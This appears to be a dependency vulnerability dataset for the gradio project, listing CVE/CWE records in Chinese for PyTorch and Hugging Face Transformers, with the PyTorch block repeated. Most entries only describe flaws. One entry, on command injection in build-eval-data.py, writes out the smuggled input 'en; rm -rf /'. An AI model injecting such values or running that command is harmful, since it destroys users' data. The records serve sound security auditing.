gradio-app_gradio,torch,,True,CVE-2022-45907,CWE-94,2022-11-26,PyTorch是一个开源机器学习框架，提供张量计算、构建神经网络等功能。其torch.jit.annotations.parse_type_line组件存在代码注入漏洞，原因是对eval的使用不安全，导致潜在的任意代码执行。,1,2
gradio-app_gradio,torch,,True,CVE-2024-31580,CWE-122,2024-04-17,PyTorch是一个开源的Python包，主要用于张量计算和动态神经网络，并且具有强大的GPU加速功能。在v2.2.0之前的版本中，/runtime/vararg_functions.cpp组件中存在堆缓冲区溢出漏洞。由于函数的大小检查不当，攻击者可以通过提供精心构造的输入导致拒绝服务(DoS)，甚至可能执行任意代码。,2,0
gradio-app_gradio,torch,,True,CVE-2024-31583,CWE-416,2024-04-17,PyTorch 是一个以开源方式提供的 Python 库，专门用于神经网络构建与张量计算，具备强大的 GPU 加速能力。此漏洞涉及内存的释放后重用，位于 torch/csrc/jit/mobile/interpreter.cpp 组件中，由于内存管理不当可能导致此问题。攻击者可通过该漏洞执行任意代码或引发拒绝服务攻击。,2,0
gradio-app_gradio,torch,,True,CVE-2024-48063,CWE-502,2024-10-29,<p>PyTorch是一个由PyTorch开源社区提供的常用机器学习框架，广泛应用于深度学习和人工智能开发。此漏洞在PyTorch版本2.4.1及之前的版本中发现，该漏洞源于用于分布式RPC任务的RemoteModule模块。当应用程序允许从未经验证的来源加载和执行代码时，会导致远程代码执行漏洞。此漏洞会使攻击者能够在没有适当权限或安全审查的情况下执行任意代码。</p>,1,1
gradio-app_gradio,torch,,True,CVE-2025-3730,CWE-404,2025-04-16,PyTorch是一个广泛使用的开源深度学习框架，其提供了动态神经网络的构建和强力的GPU加速支持。该框架中的torch.nn.functional.ctc_loss函数在处理输入为空的张量时，会在文件 aten/src/ATen/native/LossCTC.cpp中引发拒绝服务漏洞。攻击者可以通过触发该漏洞使得系统崩溃，导致服务不可用。,3,0
gradio-app_gradio,torch,,True,CVE-2024-7804,CWE-502,,PyTorch 是一个开源的 Python 深度学习框架，广泛用于机器学习和人工智能应用。该框架的 RPC 组件 (torch.distributed.rpc) 在 2.3.1 及其之前的版本中存在反序列化漏洞。该漏洞源于在反序列化 PythonUDF 对象时缺乏安全验证，攻击者能够通过发送恶意序列化的 PythonUDF 对象来远程执行任意代码，从而在主节点上实现远程代码执行 (RCE)。,1,1
gradio-app_gradio,torch,,True,CVE-2025-32434,CWE-502,2025-04-18,PyTorch 是一个用于深度学习的 Python 包，提供强大的 GPU 加速和自动微分能力。该漏洞存在于 PyTorch 2.5.1 及之前的版本中。当用户使用 torch.load 方法并将 weights_only 参数设置为 True 时，攻击者可以通过构造恶意模型文件强制调用 legacy_load 方法，从而实现远程命令执行，即使官方文档认为在此模式下是安全的。漏洞的根本原因在于反序列化过程中缺乏充分的安全验证。,1,1
gradio-app_gradio,torch,,True,CVE-2025-2953,CWE-404,2025-03-30,PyTorch 是一个深度学习框架，提供了动态神经网络和张量计算功能。该组件中受影响的函数 torch.mkldnn_max_pool2d 存在一个拒绝服务漏洞。这是由于在处理张量过程中发生了不当的资源关闭或释放，可能导致系统崩溃。本地攻击者可以通过特制输入触发此漏洞，导致服务中断。,3,0
gradio-app_gradio,torch,,True,CVE-2024-31584,CWE-125,2024-04-19,"PyTorch是PyTorch开源的一个 Python 包。
Pytorch v2.2.0之前版本存在安全漏洞，该漏洞源于组件 torch/csrc/jit/mobile/flatbuffer_loader.cpp存在越界读取漏洞。",3,0
gradio-app_gradio,torch,,True,CVE-2025-55553,CWE-248,2025-09-25,PyTorch 是一个广泛使用的开源机器学习框架，主要用于深度学习模型的开发和训练。组件 proxy_tensor.py 是 PyTorch 的一部分，负责处理张量代理操作。此漏洞因组件 proxy_tensor.py 中存在的语法错误导致，攻击者可以通过触发该错误使目标系统进入不可用状态，从而造成拒绝服务（DoS）。利用该漏洞无需复杂的技术手段，可能通过特定的输入数据引发异常错误，从而导致服务中断。,3,2
gradio-app_gradio,torch,,True,CVE-2025-55560,CWE-400,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，支持多种机器学习任务和模型训练。该漏洞影响 PyTorch v2.7.0，当模型使用了 `torch.Tensor.to_sparse()` 和 `torch.Tensor.to_dense()` 方法并通过 Inductor 编译时，可能会导致拒绝服务 (DoS)。漏洞成因可能与 Inductor 编译器在处理稀疏与密集张量转换时出现的内存或计算资源耗尽问题有关。攻击者可以通过特制的模型触发该问题，从而使系统无法正常响应。,4,2
gradio-app_gradio,torch,,True,CVE-2025-55558,CWE-400,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，通常用于构建和训练神经网络。该框架支持多种模块和操作，包括 torch.nn.Conv2d（二维卷积层）、torch.nn.functional.hardshrink（硬收缩激活函数）以及 torch.Tensor.view 和 torch.mv（矩阵向量乘法）。Inductor 是 PyTorch 的编译器部分，负责将模型代码编译为高效运行的计算图。在 PyTorch v2.7.0 中，当包含上述模块的模型经过 Inductor 编译时，会触发缓冲区溢出问题。缓冲区溢出通常是由于代码中对内存管理不当或缺乏边界检查导致的，这可能会导致存储数据的内存被过度写入，从而破坏程序的正常运行。,4,2
gradio-app_gradio,torch,,True,CVE-2025-55557,CWE-248,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，主要用于构建和训练神经网络。torch.cummin 是 PyTorch 中的一个函数，用于计算张量的逐元素累积最小值。Inductor 是 PyTorch 的一个编译器后端，用于优化模型运行性能。在 PyTorch v2.7.0 中，当模型包含 torch.cummin 函数并使用 Inductor 编译时，会触发 Name Error。此错误可能导致系统无法正常运行，进而引发拒绝服务（DoS）。漏洞的成因可能是 Inductor 编译器在处理 torch.cummin 函数时未正确处理某些变量或名称解析，导致程序在运行时崩溃。,3,2
gradio-app_gradio,torch,,True,CVE-2025-46148,CWE-1284,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，支持动态计算图和自动梯度计算，用于构建和训练神经网络。nn.PairwiseDistance 是 PyTorch 中的一个模块，主要用于计算向量之间的距离。在 PyTorch 2.6.0 及之前的版本中，当启用 eager 模式时，该模块在计算 p=2 的距离时会产生错误结果。该问题可能由于实现中的算法逻辑错误或数据处理方式不当导致。,4,2
gradio-app_gradio,torch,,True,CVE-2025-2149,CWE-665,2025-03-10,<p>PyTorch 是一个开源的深度学习框架，广泛用于机器学习和人工智能领域。受影响的组件是量化 Sigmoid 模块中的 nnq_Sigmoid 函数。PyTorch 的量化机制旨在减少模型的大小并提高推理速度，其中 nnq_Sigmoid 函数是用于激活函数的量化实现。漏洞的根本原因在于对参数 scale/zero_point 的处理不当，导致该组件的初始化过程发生错误。这种处理不当可能导致量化参数在初始化过程中被错误设置，进而影响模型的精度或功能。</p>,4,0
gradio-app_gradio,torch,,True,CVE-2025-2148,CWE-119,2025-03-10,<p>PyTorch 是一个用于机器学习的开源 Python 库，广泛应用于深度学习模型的构建与训练。此漏洞出现在 PyTorch 2.6.0+cu124 版本的 torch.ops.profiler._call_end_callbacks_on_jit_fut 函数中，该函数处理过程中由于输入参数 None 导致内存损坏。这是一种缓冲区错误，可能由于未正确处理输入而导致不安全的内存操作。</p>,4,0
gradio-app_gradio,torch,,True,CVE-2025-3121,CWE-119,2025-04-02,<p>PyTorch是一个开源的机器学习框架，广泛用于深度学习模型的开发和训练。该框架的2.6.0版本中，torch.jit.jit_module_from_flatbuffer函数存在内存损坏问题，导致缓冲区错误。此漏洞源于函数在处理flatbuffer的数据时没有正确管理内存，可能引发内存溢出或损坏，从而影响系统稳定性。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-2998,CWE-119,2025-03-31,<p>PyTorch 是一个开源的深度学习框架，广泛用于各种机器学习和深度学习项目。该漏洞影响了 PyTorch 版本 2.6.0 中的函数 torch.nn.utils.rnn.pad_packed_sequence。PyTorch 提供丰富的神经网络构件与优化工具，帮助开发者构建复杂的深度学习模型。在该漏洞中，由于函数在处理输入时未进行适当的长度验证，导致出现内存损坏问题。这种处理不当使得本地用户有机会通过特定输入数据触发内存操作异常，导致内存访问错误。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-2999,CWE-119,2025-03-31,<p>PyTorch 是一个开源的机器学习框架，提供了深度学习所需的核心功能。此漏洞影响了 PyTorch 2.6.0 版本中的 torch.nn.utils.rnn.unpack_sequence 函数。由于该函数在处理内存操作时存在不当处理，导致出现内存损坏从而引发缓冲区溢出问题。漏洞成因根本于对输入数据的长度大小缺乏正确验证，可能导致系统的内存被意外覆盖或破坏。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-3001,CWE-119,2025-03-31,<p>PyTorch 是一个广泛使用的开源深度学习框架，支持用于科学研究和商业应用的复杂张量计算和自动求导特性。该漏洞出现在 PyTorch 2.6.0 版本的 torch.lstm_cell 函数中，由于该函数未能正确验证输入数据的长度大小，攻击者可以通过操控输入数据导致内存损坏。由于内存地址定位错误或指针操作不当，使得进程内存中相邻区域可能被篡改或控制，进而引发程序异常或恶意代码执行。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-3000,CWE-119,2025-03-31,<p>PyTorch 是一个广泛使用的深度学习框架，提供自动求导和灵活的计算图功能。漏洞存在于 PyTorch 2.6.0 的 torch.jit.script 函数中，导致内存损坏。此漏洞是由于函数未能正确验证输入数据的长度大小，引发缓冲区溢出，从而导致内存损坏和潜在的代码执行风险。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2022-45907,CWE-94,2022-11-26,PyTorch是一个开源机器学习框架，提供张量计算、构建神经网络等功能。其torch.jit.annotations.parse_type_line组件存在代码注入漏洞，原因是对eval的使用不安全，导致潜在的任意代码执行。,1,2
gradio-app_gradio,torch,,True,CVE-2024-31580,CWE-122,2024-04-17,PyTorch是一个开源的Python包，主要用于张量计算和动态神经网络，并且具有强大的GPU加速功能。在v2.2.0之前的版本中，/runtime/vararg_functions.cpp组件中存在堆缓冲区溢出漏洞。由于函数的大小检查不当，攻击者可以通过提供精心构造的输入导致拒绝服务(DoS)，甚至可能执行任意代码。,2,0
gradio-app_gradio,torch,,True,CVE-2024-31583,CWE-416,2024-04-17,PyTorch 是一个以开源方式提供的 Python 库，专门用于神经网络构建与张量计算，具备强大的 GPU 加速能力。此漏洞涉及内存的释放后重用，位于 torch/csrc/jit/mobile/interpreter.cpp 组件中，由于内存管理不当可能导致此问题。攻击者可通过该漏洞执行任意代码或引发拒绝服务攻击。,2,0
gradio-app_gradio,torch,,True,CVE-2024-48063,CWE-502,2024-10-29,<p>PyTorch是一个由PyTorch开源社区提供的常用机器学习框架，广泛应用于深度学习和人工智能开发。此漏洞在PyTorch版本2.4.1及之前的版本中发现，该漏洞源于用于分布式RPC任务的RemoteModule模块。当应用程序允许从未经验证的来源加载和执行代码时，会导致远程代码执行漏洞。此漏洞会使攻击者能够在没有适当权限或安全审查的情况下执行任意代码。</p>,1,1
gradio-app_gradio,torch,,True,CVE-2025-3730,CWE-404,2025-04-16,PyTorch是一个广泛使用的开源深度学习框架，其提供了动态神经网络的构建和强力的GPU加速支持。该框架中的torch.nn.functional.ctc_loss函数在处理输入为空的张量时，会在文件 aten/src/ATen/native/LossCTC.cpp中引发拒绝服务漏洞。攻击者可以通过触发该漏洞使得系统崩溃，导致服务不可用。,3,0
gradio-app_gradio,torch,,True,CVE-2024-7804,CWE-502,,PyTorch 是一个开源的 Python 深度学习框架，广泛用于机器学习和人工智能应用。该框架的 RPC 组件 (torch.distributed.rpc) 在 2.3.1 及其之前的版本中存在反序列化漏洞。该漏洞源于在反序列化 PythonUDF 对象时缺乏安全验证，攻击者能够通过发送恶意序列化的 PythonUDF 对象来远程执行任意代码，从而在主节点上实现远程代码执行 (RCE)。,1,1
gradio-app_gradio,torch,,True,CVE-2025-32434,CWE-502,2025-04-18,PyTorch 是一个用于深度学习的 Python 包，提供强大的 GPU 加速和自动微分能力。该漏洞存在于 PyTorch 2.5.1 及之前的版本中。当用户使用 torch.load 方法并将 weights_only 参数设置为 True 时，攻击者可以通过构造恶意模型文件强制调用 legacy_load 方法，从而实现远程命令执行，即使官方文档认为在此模式下是安全的。漏洞的根本原因在于反序列化过程中缺乏充分的安全验证。,1,1
gradio-app_gradio,torch,,True,CVE-2025-2953,CWE-404,2025-03-30,PyTorch 是一个深度学习框架，提供了动态神经网络和张量计算功能。该组件中受影响的函数 torch.mkldnn_max_pool2d 存在一个拒绝服务漏洞。这是由于在处理张量过程中发生了不当的资源关闭或释放，可能导致系统崩溃。本地攻击者可以通过特制输入触发此漏洞，导致服务中断。,3,0
gradio-app_gradio,torch,,True,CVE-2024-31584,CWE-125,2024-04-19,"PyTorch是PyTorch开源的一个 Python 包。
Pytorch v2.2.0之前版本存在安全漏洞，该漏洞源于组件 torch/csrc/jit/mobile/flatbuffer_loader.cpp存在越界读取漏洞。",3,0
gradio-app_gradio,torch,,True,CVE-2025-55553,CWE-248,2025-09-25,PyTorch 是一个广泛使用的开源机器学习框架，主要用于深度学习模型的开发和训练。组件 proxy_tensor.py 是 PyTorch 的一部分，负责处理张量代理操作。此漏洞因组件 proxy_tensor.py 中存在的语法错误导致，攻击者可以通过触发该错误使目标系统进入不可用状态，从而造成拒绝服务（DoS）。利用该漏洞无需复杂的技术手段，可能通过特定的输入数据引发异常错误，从而导致服务中断。,3,2
gradio-app_gradio,torch,,True,CVE-2025-55560,CWE-400,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，支持多种机器学习任务和模型训练。该漏洞影响 PyTorch v2.7.0，当模型使用了 `torch.Tensor.to_sparse()` 和 `torch.Tensor.to_dense()` 方法并通过 Inductor 编译时，可能会导致拒绝服务 (DoS)。漏洞成因可能与 Inductor 编译器在处理稀疏与密集张量转换时出现的内存或计算资源耗尽问题有关。攻击者可以通过特制的模型触发该问题，从而使系统无法正常响应。,4,2
gradio-app_gradio,torch,,True,CVE-2025-55558,CWE-400,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，通常用于构建和训练神经网络。该框架支持多种模块和操作，包括 torch.nn.Conv2d（二维卷积层）、torch.nn.functional.hardshrink（硬收缩激活函数）以及 torch.Tensor.view 和 torch.mv（矩阵向量乘法）。Inductor 是 PyTorch 的编译器部分，负责将模型代码编译为高效运行的计算图。在 PyTorch v2.7.0 中，当包含上述模块的模型经过 Inductor 编译时，会触发缓冲区溢出问题。缓冲区溢出通常是由于代码中对内存管理不当或缺乏边界检查导致的，这可能会导致存储数据的内存被过度写入，从而破坏程序的正常运行。,4,2
gradio-app_gradio,torch,,True,CVE-2025-55557,CWE-248,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，主要用于构建和训练神经网络。torch.cummin 是 PyTorch 中的一个函数，用于计算张量的逐元素累积最小值。Inductor 是 PyTorch 的一个编译器后端，用于优化模型运行性能。在 PyTorch v2.7.0 中，当模型包含 torch.cummin 函数并使用 Inductor 编译时，会触发 Name Error。此错误可能导致系统无法正常运行，进而引发拒绝服务（DoS）。漏洞的成因可能是 Inductor 编译器在处理 torch.cummin 函数时未正确处理某些变量或名称解析，导致程序在运行时崩溃。,3,2
gradio-app_gradio,torch,,True,CVE-2025-46148,CWE-1284,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，支持动态计算图和自动梯度计算，用于构建和训练神经网络。nn.PairwiseDistance 是 PyTorch 中的一个模块，主要用于计算向量之间的距离。在 PyTorch 2.6.0 及之前的版本中，当启用 eager 模式时，该模块在计算 p=2 的距离时会产生错误结果。该问题可能由于实现中的算法逻辑错误或数据处理方式不当导致。,4,2
gradio-app_gradio,torch,,True,CVE-2025-2149,CWE-665,2025-03-10,<p>PyTorch 是一个开源的深度学习框架，广泛用于机器学习和人工智能领域。受影响的组件是量化 Sigmoid 模块中的 nnq_Sigmoid 函数。PyTorch 的量化机制旨在减少模型的大小并提高推理速度，其中 nnq_Sigmoid 函数是用于激活函数的量化实现。漏洞的根本原因在于对参数 scale/zero_point 的处理不当，导致该组件的初始化过程发生错误。这种处理不当可能导致量化参数在初始化过程中被错误设置，进而影响模型的精度或功能。</p>,4,0
gradio-app_gradio,torch,,True,CVE-2025-2148,CWE-119,2025-03-10,<p>PyTorch 是一个用于机器学习的开源 Python 库，广泛应用于深度学习模型的构建与训练。此漏洞出现在 PyTorch 2.6.0+cu124 版本的 torch.ops.profiler._call_end_callbacks_on_jit_fut 函数中，该函数处理过程中由于输入参数 None 导致内存损坏。这是一种缓冲区错误，可能由于未正确处理输入而导致不安全的内存操作。</p>,4,0
gradio-app_gradio,torch,,True,CVE-2025-3121,CWE-119,2025-04-02,<p>PyTorch是一个开源的机器学习框架，广泛用于深度学习模型的开发和训练。该框架的2.6.0版本中，torch.jit.jit_module_from_flatbuffer函数存在内存损坏问题，导致缓冲区错误。此漏洞源于函数在处理flatbuffer的数据时没有正确管理内存，可能引发内存溢出或损坏，从而影响系统稳定性。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-2998,CWE-119,2025-03-31,<p>PyTorch 是一个开源的深度学习框架，广泛用于各种机器学习和深度学习项目。该漏洞影响了 PyTorch 版本 2.6.0 中的函数 torch.nn.utils.rnn.pad_packed_sequence。PyTorch 提供丰富的神经网络构件与优化工具，帮助开发者构建复杂的深度学习模型。在该漏洞中，由于函数在处理输入时未进行适当的长度验证，导致出现内存损坏问题。这种处理不当使得本地用户有机会通过特定输入数据触发内存操作异常，导致内存访问错误。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-2999,CWE-119,2025-03-31,<p>PyTorch 是一个开源的机器学习框架，提供了深度学习所需的核心功能。此漏洞影响了 PyTorch 2.6.0 版本中的 torch.nn.utils.rnn.unpack_sequence 函数。由于该函数在处理内存操作时存在不当处理，导致出现内存损坏从而引发缓冲区溢出问题。漏洞成因根本于对输入数据的长度大小缺乏正确验证，可能导致系统的内存被意外覆盖或破坏。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-3001,CWE-119,2025-03-31,<p>PyTorch 是一个广泛使用的开源深度学习框架，支持用于科学研究和商业应用的复杂张量计算和自动求导特性。该漏洞出现在 PyTorch 2.6.0 版本的 torch.lstm_cell 函数中，由于该函数未能正确验证输入数据的长度大小，攻击者可以通过操控输入数据导致内存损坏。由于内存地址定位错误或指针操作不当，使得进程内存中相邻区域可能被篡改或控制，进而引发程序异常或恶意代码执行。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-3000,CWE-119,2025-03-31,<p>PyTorch 是一个广泛使用的深度学习框架，提供自动求导和灵活的计算图功能。漏洞存在于 PyTorch 2.6.0 的 torch.jit.script 函数中，导致内存损坏。此漏洞是由于函数未能正确验证输入数据的长度大小，引发缓冲区溢出，从而导致内存损坏和潜在的代码执行风险。</p>,3,0
gradio-app_gradio,transformers,,True,,CWE-601,2022-11-01,"## Overview
[transformers](https://pypi.org/project/transformers) is a State-of-the-art Machine Learning for JAX, PyTorch and TensorFlow

Affected versions of this package are vulnerable to Open Redirect due to referencing an obsolete link.
## Remediation
Upgrade `transformers` to version 4.23.0 or higher.
## References
- [GitHub Commit](https://github.com/huggingface/transformers/commit/ce2620194b4a8f070cd29504d34a79758affdf95)
- [GitHub PR](https://github.com/huggingface/transformers/pull/19001)
- [GitHub Release](https://github.com/huggingface/transformers/releases/tag/v4.23.0)
",3,0
gradio-app_gradio,transformers,,True,CVE-2023-2800,CWE-377,,Hugging Face Transformers 是用于 JAX、PyTorch 和 TensorFlow 的先进自然语言处理库。该漏洞出现在 4.30.0 之前的版本中，源于使用过时的 tempfile.mktemp() 方法。该方法不安全，因为在调用 mktemp() 与文件创建之间，可能有其他进程创建同名文件。这可能导致文件可用性受干扰，并可能导致敏感信息泄露。,3,1
gradio-app_gradio,transformers,,True,CVE-2023-6730,CWE-502,,Hugging Face Transformers 是为 JAX、PyTorch 和 TensorFlow 提供的先进自然语言处理框架。此组件用于处理自然语言任务，如文本分类、翻译和问答系统等。漏洞发生在 Transformers 4.36.0 之前的版本，其 root cause 是在 `RagRetriever.from_pretrained()` 函数中，`index_name` 和 `index_path` 参数会反序列化不受信任的数据，攻击者可以远程加载恶意 pickle 文件，从而绕过文件检查并在主机上执行任意代码。反序列化是将字节序列转换为对象的过程，被用于通信和存储。此漏洞允许攻击者在未验证数据合法性的情况下进行反序列化，导致代码执行。,1,1
gradio-app_gradio,transformers,,True,CVE-2023-7018,CWE-502,,Hugging Face Transformers是一个用于JAX、PyTorch和TensorFlow的先进自然语言处理库。在受到影响的版本中，使用TransfoXLTokenizer()函数可能会自动加载恶意的vocab.pkl文件，利用pickle.load函数反序列化不受信任的数据。此漏洞源于未能充分验证反序列化的数据，使攻击者可执行任意代码，控制应用程序的状态或执行流程。,1,1
gradio-app_gradio,transformers,,True,CVE-2024-3568,CWE-502,,Hugging Face Transformers 是一个为 Jax、PyTorch 和 TensorFlow 打造的用于先进自然语言处理的库。TFPreTrainedModel 类的 load_repo_checkpoint() 函数存在反序列化不受信任数据的漏洞。该漏洞允许攻击者通过构造恶意的序列化有效负载，利用函数中的 pickle.load() 方法在处理来自可能不受信任源的数据时执行任意代码和命令。这种不安全反序列化的根本原因是缺少对输入数据的信任边界控制，以及对来源不明数据的直接反序列化处理。,4,1
gradio-app_gradio,transformers,,True,CVE-2025-3933,CWE-1333,2025-07-11,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.50.3及之前版本存在安全漏洞，该漏洞源于DonutProcessor类的token2json方法存在正则表达式拒绝服务，可能导致服务中断。",3,2
gradio-app_gradio,transformers,,True,CVE-2025-3263,CWE-1333,2025-07-07,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.49.0版本存在安全漏洞，该漏洞源于transformers.configuration_utils模块中get_configuration_file函数的正则表达式复杂性不足，可能导致正则表达式拒绝服务攻击。",3,2
gradio-app_gradio,transformers,,True,CVE-2025-3777,CWE-20,2025-07-07,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.49.0及之前版本存在输入验证错误漏洞，该漏洞源于image_utils.py中URL验证不足，可能导致钓鱼攻击。",3,0
gradio-app_gradio,transformers,,True,CVE-2025-3264,CWE-1333,2025-07-07,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.49.0版本存在安全漏洞，该漏洞源于dynamic_module_utils.py中get_imports函数的正则表达式复杂性不足，可能导致正则表达式拒绝服务攻击。",3,2
gradio-app_gradio,transformers,,True,CVE-2025-5197,CWE-1333,2025-08-06,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.51.3及之前版本存在安全漏洞，该漏洞源于正则表达式拒绝服务攻击。",3,2
gradio-app_gradio,transformers,,True,CVE-2025-6921,CWE-400,2025-09-23,<p>transformers是Hugging Face开源的一个用于机器学习的应用程序。 transformers 4.53.0之前版本存在资源管理错误漏洞，该漏洞源于_do_use_weight_decay方法处理用户控制的正则表达式时存在缺陷，可能导致正则表达式拒绝服务攻击。</p>,3,2
gradio-app_gradio,transformers,,True,CVE-2024-11394,CWE-502,2024-11-22,Hugging Face Transformers 是一个用于 Jax、PyTorch 和 TensorFlow 的自然语言处理框架。该框架提供构建和应用 Transformer 模型的丰富工具。在其模型文件处理过程中，由于缺乏对用户提供数据的充分验证，导致存在不安全反序列化漏洞，攻击者可以通过插入特制的未验证模型文件进行反序列化，进而在应用中执行任意代码。,4,1
gradio-app_gradio,transformers,,True,CVE-2024-12720,CWE-1333,2025-03-20,Hugging Face Transformers 是一个开源的自然语言处理库，广泛应用于构建和训练先进的模型。该库支持 Jax、PyTorch 和 TensorFlow 的集成。在 tokenization_nougat_fast.py 文件中的 post_process_single() 函数存在正则表达式的处理漏洞。此漏洞由于正则表达式在特定条件下表现出指数时间复杂性，导致出现过度回溯，从而造成 CPU 使用率过高以及应用程序潜在的停机，形成拒绝服务 (DoS) 的场景。受影响的版本是 v4.46.3。,3,2
gradio-app_gradio,transformers,,True,CVE-2024-11392,CWE-502,2024-11-22,Hugging Face Transformers 是一个开源项目，提供 Jax、PyTorch 和 TensorFlow 的自然语言处理模型库。其主要用于构建和训练深度学习模型以及处理自然语言数据。在处理配置文件时，因数据验证不当，导致可能不受信任的数据被反序列化。此漏洞的核心是缺乏对用户输入数据的充分验证，从而使得攻击者能够控制程序执行流，仅需用户访问恶意页面或打开恶意配置文件即可触发。该漏洞允许嵌入恶意代码执行，并在应用环境中获得与当前用户相同的权限。,4,1
gradio-app_gradio,transformers,,True,CVE-2024-11393,CWE-502,2024-11-22,Hugging Face Transformers 是一个用于 Jax、PyTorch 和 TensorFlow 的先进自然语言处理库，提供各种预训练模型以支持多种自然语言处理任务。漏洞存在于模型文件解析过程中，因缺乏对用户输入数据的充分验证，导致不受信任的数据被反序列化。攻击者能利用该漏洞在受影响的安装上以当前用户权限执行任意代码。此漏洞主要影响版本低于4.48.0的转换脚本，但不影响核心库功能。,4,1
gradio-app_gradio,transformers,,True,CVE-2025-1194,CWE-1333,2025-04-29,Hugging Face Transformers 是一个用于自然语言处理的开源库，提供了多种预训练模型以便于开发者快速构建机器学习应用。该漏洞存在于 GPT-NeoX-Japanese 模型的 `tokenization_gpt_neox_japanese.py` 文件中，具体是在 SubWordJapaneseTokenizer 类中。当正则表达式处理经过精心构造的输入时，会导致漏洞产生。根本原因在于某些条件下的正则表达式表现出指数复杂性，导致过度回溯。这可能导致 CPU 使用率升高，进而造成应用程序停机，有效地生成拒绝服务 (DoS) 场景。受影响的版本为 v4.48.1（最新）。,3,2
gradio-app_gradio,transformers,,True,CVE-2025-2099,CWE-1333,2025-05-19,<p>在huggingface/transformers版本v4.48.3的`transformers.testing_utils`模块中，`preprocess_string()`函数存在一个漏洞。该漏洞允许通过正则表达式拒绝服务（ReDoS）攻击进行利用。处理文档字符串中代码块所使用的正则表达式包含嵌套量词，导致在处理含有大量换行符的输入时发生指数级回溯。</p>,3,2
gradio-app_gradio,transformers,,True,CVE-2025-6638,CWE-1333,2025-09-12,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.52.4版本存在安全漏洞，该漏洞源于MarianTokenizer的remove_language_code方法存在正则表达式处理效率问题，可能导致正则表达式拒绝服务。",3,2
gradio-app_gradio,transformers,,True,,,,<p>Transformers是一个支持多种任务的开源自然语言处理库，基于PyTorch和TensorFlow构建。由于在GitHub Actions工作流的分支名称未正确清理，攻击者可以利用此漏洞实现任意代码注入。当攻击者提供特制的分支名称时，可以触发不受信任的命令执行。</p>,2,1
gradio-app_gradio,transformers,,True,,,,<p>HuggingFace Transformers 是一个用于自然语言处理和机器学习的开源库，提供各种工具和模型以简化开发。该库中的 load_tool 功能允许从 HuggingFace Hub 加载外部工具，但存在远程代码执行漏洞。攻击者可以在未启用 `Trust Remote Code` 的情况下，通过从恶意构建的库加载工具，导致执行任意 Python 代码。此漏洞的调用链为 `load_tool() -&gt; Tool.from_hub() -&gt; get_class_from_dynamic_module() -&gt; get_class_in_module() -&gt; importlib.import_module(module_path)`，其中的 importlib.import_module 函数在没有任何警告的情况下执行导入操作。</p>,3,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个由 Hugging Face 开发的开源自然语言处理模型库，旨在提供强大的模型以简化深度学习任务。该库中的 TransfoXLCorpus 组件存在一个远程代码执行漏洞，当用户按照 Hugging Face 的官方指导使用该模型时，恶意用户可以通过不安全的 torch.load 方法进行攻击。攻击的根本原因在于该方法在未正确处理受信任输入时，可能执行任意可执行代码。具体来说，攻击者可利用该漏洞使受害者在本地执行恶意代码，从而在系统中创建特定文件。</p>,4,1
gradio-app_gradio,transformers,,True,,,,"<p>Transformers 是一个开源的 Python 库，旨在简化和加速使用深度学习模型的自然语言处理任务。在 `build-eval-data.py` 代码片段中，使用用户提供的字符串动态生成 shell 命令。攻击者可以通过输入特定的字符或命令，利用此漏洞进行远程命令注入。例如，如果用户将变量 `src` 或 `tgt` 设置为 ""en; rm -rf /""，那么代码将生成执行 `rm -rf /` 的命令，从而导致系统数据丢失或损坏。由于缺乏对输入的处理和验证，恶意用户可以执行任意 shell 命令。</p>",1,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个用于自然语言处理的开源 Python 库，提供多种模型和工具以简化文本建模的过程。该库的 export 函数 TextDatasetForNextSentencePrediction() 存在一个反序列化漏洞，如果读取的文件路径为 C:/1.txt，程序将会读取当前目录中精心构造的副本。该漏洞的根本原因在于库中对输入数据的处理不当，攻击者可以借此构造恶意数据流通过反序列化执行任意命令。</p>,1,1
gradio-app_gradio,transformers,,True,CVE-2025-6051,CWE-1333,2025-09-14,<p>Hugging Face Transformers 是一个用于自然语言处理 (NLP) 的开源库，提供了许多预训练的模型和工具，广泛应用于文本分类、机器翻译、文本生成等任务。此漏洞存在于该库的 `EnglishNormalizer` 类的 `normalize_numbers()` 方法中。该方法用于对数字字符串进行归一化处理，但在处理特制的长数字序列时，由于正则表达式匹配效率低下，会导致 CPU 资源过度消耗。攻击者可以通过向应用程序发送特制的输入数据，触发该漏洞，进而导致系统性能严重下降。</p>,3,2
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个用于自然语言处理的开源 Python 库，旨在借助深度学习模型简化文本处理任务。WaitCanDeadlock 漏洞是一种与并发相关的特定问题，通常发生在多线程系统中。当一个持有锁的线程被迫无期限地等待一个无法满足的条件时，可能导致死锁场景的发生。这种漏洞的触发条件为：使用 subprocess.Popen 启动子进程并直接调用 proc.wait()，如果子进程输出内容过大时，就可能会导致死锁，因此建议使用 proc.communicate() 方法来避免这一问题。</p>,1,1
